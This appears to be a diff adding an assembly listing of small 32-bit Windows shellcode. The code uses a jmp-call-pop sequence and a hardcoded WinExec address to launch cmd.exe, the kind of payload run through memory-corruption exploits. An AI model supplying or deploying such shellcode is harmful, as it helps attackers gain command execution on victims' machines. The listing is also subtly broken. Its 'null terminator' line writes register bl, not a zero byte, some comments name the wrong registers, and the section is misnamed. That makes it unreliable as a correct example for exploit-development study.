@@ -1,0 +1,16 @@
+     1                                  section .txt
+     2                                  	global _start
+     3                                  _start:
+     4 00000000 EB0F                    	jmp short getcommand
+     5                                  process:
+     6 00000002 31C0                    	xor eax, eax		; clearing registers
+     7 00000004 5B                      	pop ebx				; getting cmd.exe in eax
+     8 00000005 885B07                  	mov [ebx+7], bl		; termination string with null
+     9 00000008 BA61305B77              	mov edx, 0x775b3061	; storing the WinExec Address in registers
+    10 0000000D 50                      	push eax			; push paramenter
+    11 0000000E 53                      	push ebx			; push paramenter
+    12 0000000F FFD2                    	call edx			; calling WinExec
+    13                                  	
+    14                                  getcommand:
+    15 00000011 E8ECFFFFFF              	call process
+    16 00000016 636D642E657865          	db "cmd.exe"
